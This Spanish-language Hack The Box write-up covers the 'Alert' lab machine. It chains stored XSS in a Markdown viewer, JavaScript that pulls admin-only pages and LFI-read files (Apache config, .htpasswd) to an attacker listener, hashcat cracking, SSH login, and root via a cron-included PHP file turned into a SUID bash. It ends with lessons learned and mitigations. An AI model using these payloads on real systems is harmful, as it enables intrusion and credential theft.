---
title: "Alert"
description: "Writeup de Alert - Hack The Box - Dificultad: Easy. Stored XSS en Markdown + LFI para leer .htpasswd + cron sobre PHP escribible por grupo para root."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - stored-xss
  - markdown-injection
  - lfi
  - htpasswd-crack
  - cron-abuse
  - suid-bash
---


# 🐧 Alert

> 📅 Fecha: 2026-05-22
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 20.04.6 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 4h 20m
> 🌐 IP: `10.129.231.188`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial: XSS → LFI](#-explotación-inicial-xss--lfi)
- [Crack del .htpasswd y acceso SSH](#-crack-del-htpasswd-y-acceso-ssh)
- [Escalada de Privilegios (albert → root)](#-escalada-de-privilegios-albert--root)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Alert es una máquina Linux que expone un visor de Markdown vulnerable a **Stored XSS** (los archivos `.md` se renderizan sin sanitizar `<script>`). El atacante sube un payload, envía la URL del archivo compartido al admin mediante el formulario `/contact.php`, y cuando el admin la abre se dispara una **cadena XSS → LFI** que explota el parámetro `file=` de `messages.php`. Mediante ese LFI se exfiltran la configuración de Apache (que revela el vhost `statistics.alert.htb` y la ruta de su `.htpasswd`) y el propio `.htpasswd`. El hash `$apr1$` se rompe con `hashcat` (modo 1600) usando `rockyou.txt` en menos de 1 segundo → `albert:manchesterunited`. Acceso SSH como `albert`, que pertenece al grupo `management`. Ese grupo tiene escritura sobre `/opt/website-monitor/config/configuration.php`, un archivo PHP **incluido periódicamente por un cron de root**. Se inyecta `shell_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')`, se espera el ciclo del cron, y se obtiene shell con `euid=0`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Stored XSS en Markdown, LFI sin filtrar, hash `$apr1$` débil, cron root sobre PHP escribible por grupo |
| CVEs | N/A (cadena de misconfiguraciones) |
| Herramientas | `nmap`, `ffuf`, `python3 -m http.server`, BurpSuite, `hashcat`, `ssh` |
| Tiempo total | ~4h 20m |

---

## 🔍 Reconocimiento

### Escaneo de puertos (nmap)

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN nmap.txt 10.129.231.188
```

**Salida real:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 16:31 -0400
Nmap scan report for 10.129.231.188
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 51.72 seconds
```

> 💡 **Análisis:** dos servicios — SSH (22) y Apache (80). El header `Did not follow redirect to http://alert.htb/` indica que la app exige el Host header correcto. Hay que agregar el dominio a `/etc/hosts` antes de empezar a probar nada en la web.

### Resolución local

```bash
echo "10.129.231.188 alert.htb" | sudo tee -a /etc/hosts
```

```text
[sudo] password for warrior:
10.129.231.188 alert.htb
```

---

## 🗂️ Enumeración

### Fuzzing de subdominios (vhosts)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://alert.htb \
     -H "Host: FUZZ.alert.htb" \
     -fc 301,302
```

**Salida real (recortada):**

```text
 :: Method      : GET
 :: URL         : http://alert.htb
 :: Header      : Host: FUZZ.alert.htb
 :: Filter      : Response status: 301,302

statistics    [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 149ms]
:: Progress: [4989/4989] :: Job [1/1] :: 273 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

> 💡 **Análisis:** descubrimos un segundo vhost `statistics.alert.htb` que devuelve **401 Unauthorized** → tiene autenticación **HTTP Basic**. Es lo que nos da el norte: si conseguimos credenciales, ese vhost es el siguiente paso. Apuntar a leer su `.htpasswd`.

### Fuzzing de directorios en el sitio principal

```bash
ffuf -u "http://alert.htb/FUZZ" \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
     -fs 0
```

**Salida real:**

```text
.htpasswd       [Status: 403, Size: 274]
.htaccess       [Status: 403, Size: 274]
css             [Status: 301, Size: 304]
messages        [Status: 301, Size: 309]
server-status   [Status: 403, Size: 274]
uploads         [Status: 301, Size: 308]
:: Progress: [20481/20481] :: Job [1/1] :: 276 req/sec :: Duration: [0:01:17] :: Errors: 0 ::
```

> 💡 **Análisis:** dos directorios interesantes: `messages/` (sospechoso, parece backend interno) y `uploads/` (típico vector de upload). Navegando la app, se descubre que existen los endpoints `index.php?page=alert`, `visualizer.php?link_share=<archivo>.md` (visor de Markdown) y `contact.php` (formulario que probablemente lo lea un admin). Eso es exactamente el patrón clásico de **Stored XSS → exfiltración via admin**.

---

## 🚪 Explotación Inicial: XSS → LFI

### Vector 1: Stored XSS en archivos Markdown

El visor `visualizer.php` acepta archivos `.md` subidos y los renderiza directamente. Hipótesis: no sanitiza `<script>`. Subimos un payload mínimo apuntando a nuestro propio servidor:

**`xss.md`:**

```html
<script src="http://10.10.14.130:3000/pwned.js"></script>
```

**`pwned.js`** — lee `messages.php` (que solo el admin autenticado puede ver) y exfiltra el resultado en base64:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.130:3000/?content=' + btoa(req.responseText), true);
req2.send();
```

### Subida del Markdown (Burp)

```http
POST /visualizer.php HTTP/1.1
Host: alert.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaT91H5Y10NtEydcV

------WebKitFormBoundaryaT91H5Y10NtEydcV
Content-Disposition: form-data; name="file"; filename="xss.md"
Content-Type: text/markdown

<script src="http://10.10.14.130:3000/pwned.js"></script>

------WebKitFormBoundaryaT91H5Y10NtEydcV--
```

**Respuesta:**

```text
HTTP/1.1 200 OK
[...]
<body>
    <script src="http://10.10.14.130:3000/pwned.js"></script><a class="share-button" href="http://alert.htb/visualizer.php?link_share=6a1047f089aac6.60034791.md" target="_blank">Share Markdown</a></body>
</html>
```

> 💡 **Análisis:** la respuesta nos devuelve el **`link_share`** (el "share token" único del archivo subido). Confirmado:
> 1. El `<script>` se sirve literal sin escapar.
> 2. Hay que conseguir que **el admin** abra la URL `http://alert.htb/visualizer.php?link_share=6a1047f089aac6.60034791.md` para que el XSS se dispare en su sesión.

### Levantar listener para recibir la exfiltración

```bash
python3 -m http.server 3000
```

```text
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
```

### Hacer que el admin visite el enlace (via `/contact.php`)

```http
POST /contact.php HTTP/1.1
Host: alert.htb
Content-Type: application/x-www-form-urlencoded

email=bamyge%40mailinator.com&message=http%3A%2F%2Falert.htb%2Fvisualizer.php%3Flink_share%3D6a1047f089aac6.60034791.md
```

**Respuesta:**

```text
HTTP/1.1 302 Found
Location: http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!
```

A los pocos segundos, el listener recibe la visita del admin:

```text
10.129.231.188 - - [22/May/2026 08:13:07] "GET /pwned.js HTTP/1.1" 200 -
10.129.231.188 - - [22/May/2026 08:13:07] "GET /?content=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
```

Decodificando el base64:

```html
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```

> 💡 **Análisis clave:** el endpoint `/messages.php` toma un parámetro **`file=`**. Ese patrón es 90% LFI. Como el XSS corre **en el contexto del admin** (que sí puede acceder a `/messages.php`), podemos pivotar a un segundo payload que abuse de `file=` con path traversal.

### Vector 2: LFI a través de `messages.php?file=`

Actualizo `pwned.js` para que en lugar de leer la lista de mensajes, lea el **virtual host de Apache** y descubra dónde vive el `.htpasswd`:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-enabled/000-default.conf', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.130:3000/?content=' + btoa(req.responseText), true);
req2.send();
```

Repetimos el ciclo (subir nuevo `xss.md` apuntando al `pwned.js` actualizado → enviar el `link_share` por `/contact.php`). El admin lo abre y recibimos:

```text
10.129.231.188 - - [22/May/2026 08:27:16] "GET /?content=PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAg[...]Cjwvc[...]= HTTP/1.1" 200 -
```

Decodificado:

```apache
<VirtualHost *:80>
    ServerName alert.htb
    DocumentRoot /var/www/alert.htb
    [...]
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb
    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>
    [...]
</VirtualHost>
```

> 💡 **Análisis:** el `.htpasswd` del vhost `statistics.alert.htb` está en **`/var/www/statistics.alert.htb/.htpasswd`**. Siguiente iteración del LFI: leer ese archivo.

### Exfiltrar el `.htpasswd`

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.130:3000/?content=' + btoa(req.responseText), true);
req2.send();
```

Recibimos:

```text
10.129.231.188 - - [22/May/2026 08:29:38] "GET /?content=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1" 200 -
```

Decodificado:

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

> 💡 **Análisis:** hash `$apr1$` (MD5-APR1 de Apache, modo hashcat **1600**). Tiene salt corto y es relativamente débil contra wordlists.

---

## 🔑 Crack del `.htpasswd` y acceso SSH

### Crack con hashcat

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Salida real (recortada):**

```text
hashcat (v7.1.2) starting
[...]
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
Time.Started.....: Fri May 22 08:31:45 2026 (1 sec)
Time.Estimated...: Fri May 22 08:31:46 2026 (0 secs)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

> 💡 **Análisis:** roto en **1 segundo** — la contraseña `manchesterunited` está en `rockyou.txt` posiciones tempranas. Reutilización de credenciales: vamos a probarla directamente contra SSH.

### Acceso SSH como `albert`

```bash
ssh albert@alert.htb
# password: manchesterunited
```

```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
[...]
Last login: Tue Nov 19 14:19:09 2024 from 10.10.14.23
albert@alert:~$ ls
user.txt
albert@alert:~$ cat user.txt
[user flag]
```

> 💡 **Análisis:** acceso SSH directo (no había MFA ni jump host). Flag de usuario obtenida.

---

## 🚀 Escalada de Privilegios (albert → root)

### Enumeración: grupos del usuario y aplicación interna en `/opt`

```bash
albert@alert:~$ id
```

```text
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

> 💡 **Análisis:** `albert` pertenece al grupo **`management`** (GID 1001). Buscar todo lo que ese grupo pueda modificar:

> ⚠️ **TODO:** falta documentar el comando de descubrimiento del directorio vulnerable. Sugerencia para pegar la salida real:
> ```bash
> find / -group management 2>/dev/null
> find / -group management -writable 2>/dev/null
> ls -la /opt/website-monitor/
> ls -la /opt/website-monitor/config/
> ```

Tras la enumeración, se identifica `/opt/website-monitor/config/configuration.php`, propiedad de `root:management`, con permisos `g+w`. Combinado con que existe un **cron job de root** que hace `include` de ese archivo periódicamente (lo que se intuye observando procesos con `ps -ef | grep cron` y comprobando el `crontab` o `/etc/cron.d/`), tenemos un **vector RCE como root**.

> ⚠️ **TODO:** pegar la salida real de `ls -la /opt/website-monitor/config/` y, si tienes, evidencia del cron (`cat /etc/cron.d/*`, `pspy64`, etc.).

### Forwarding del panel interno (opcional, para reconocer la app)

Para inspeccionar visualmente el panel de website-monitor que corre en `127.0.0.1:8080`:

```bash
ssh -L 8080:127.0.0.1:8080 albert@alert.htb
```

```text
bind [127.0.0.1]:8080: Address already in use
[...]
Last login: Fri May 22 12:35:22 2026 from 10.10.14.130
albert@alert:~
```

> 💡 **Análisis:** el bind local falla porque ya tienes algo escuchando en tu `8080`. No es crítico para la explotación, solo era para mirar la UI. Pasamos directo al exploit.

### Vector: inyección PHP en archivo de config incluido por cron root

Sobrescribo `configuration.php` manteniendo la constante original (para no romper la inclusión) y añadiendo un `shell_exec` que crea un bash con SUID:

```bash
albert@alert:/opt/website-monitor/config$ cat > /opt/website-monitor/config/configuration.php << 'EOF'
<?php
define('PATH', '/opt/website-monitor');
shell_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
EOF
```

> 💡 **Análisis:** `chmod +s` activa el bit SUID. Al ejecutar `/tmp/rootbash -p`, bash mantiene el `euid=0` heredado del binario en lugar de bajarlo al UID real.

### Esperar el ciclo del cron (~1 minuto) y disparar la shell SUID

```bash
albert@alert:/opt/website-monitor/config$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(albert) gid=1000(albert) euid=0(root) egid=0(root) groups=0(root),1000(albert),1001(management)
rootbash-5.0# cat /root/root.txt
[root flag]
```

> 💡 **Análisis:** `euid=0(root)` → control total. La flag `-p` es **obligatoria** para que bash no degrade los privilegios efectivos al UID real (1000/albert).

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. Stored XSS en visor de Markdown (visualizer.php)
        ↓
2. Envío del link al admin via /contact.php
        ↓
3. Admin abre el link → XSS dispara pwned.js en SU sesión
        ↓
4. pwned.js lee /messages.php → revela parámetro file= (LFI)
        ↓
5. LFI lee /etc/apache2/sites-enabled/000-default.conf
        ↓ revela ruta del .htpasswd
6. LFI lee /var/www/statistics.alert.htb/.htpasswd
        ↓
7. hashcat -m 1600 → albert:manchesterunited
        ↓
8. SSH como albert  →  user.txt
        ↓
9. albert ∈ grupo management → escribe /opt/website-monitor/config/configuration.php
        ↓
10. Cron root incluye el PHP → shell_exec("cp /bin/bash /tmp/rootbash; chmod +s …")
        ↓
11. /tmp/rootbash -p  →  euid=0  →  root.txt
```

---

## 🎓 Lecciones Aprendidas

- **Stored XSS + admin-bot** = LFI by-proxy. El navegador del admin es tu nuevo "user-agent privilegiado": cualquier endpoint protegido por sesión es leíble vía `fetch()`/`XMLHttpRequest` desde el XSS.
- **El parser de Markdown no es un sandbox**. Si renderiza `<script>` tal cual (como muchos parsers básicos `php-markdown` sin `safe_mode`), es XSS directo. Soluciones: usar DOMPurify del lado servidor, o `CommonMark` con `safe: true`.
- **Pivote XSS → LFI → archivos del sistema**: la cadena es `messages.php?file=../../../../etc/apache2/...`. Buscar primero **el config de Apache** porque te dice **dónde** está todo lo demás (vhosts, AuthUserFile, DocumentRoot, etc.) — ahorra cientos de prueba-error.
- **`$apr1$` con rockyou**: hashes htpasswd son frecuentemente débiles. Modo `-m 1600` en hashcat, rara vez necesitas reglas.
- **Cron de root sobre archivo escribible por grupo** = el LPE más limpio. Buscar siempre con `find / -group <grupo_de_user> -writable -type f 2>/dev/null` y comparar con `cat /etc/cron.d/*` y `systemctl list-timers`.

### Mitigaciones (lado defensivo)
1. **Sanitizar el Markdown** del lado servidor con un parser en modo `safe` (CommonMark, marked con `sanitize: true`, o post-procesar con DOMPurify en el servidor).
2. **CSP estricto** (`script-src 'self'`) en `visualizer.php` para neutralizar `<script src=...>` externos aunque la sanitización falle.
3. **Validar / normalizar el parámetro `file=`** de `messages.php`: rechazar `..`, normalizar la ruta con `realpath()` y restringir a un directorio whitelisteado.
4. **Política de contraseñas**: prohibir tops de rockyou, exigir longitud mínima y entropía. Considerar migración a `bcrypt` (htpasswd `-B`) en lugar de `$apr1$`.
5. **Permisos correctos en `/opt/website-monitor/config/`**: `root:root 750` y revisar la membresía del grupo `management` — ¿necesita realmente albert estar ahí?
6. **No `include` archivos de configuración escribibles por usuarios menos privilegiados**. Si el cron necesita leer config, que sea de solo lectura y validado con checksum.

---

## 📚 Referencias

- [HackTricks - Server Side XSS via Markdown](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
- [HackTricks - Local File Inclusion (LFI)](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Hashcat - Mode 1600 (md5apr1)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [GTFOBins - bash (SUID)](https://gtfobins.github.io/gtfobins/bash/#suid)
- [Apache Docs - htpasswd / bcrypt](https://httpd.apache.org/docs/2.4/programs/htpasswd.html)
- [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)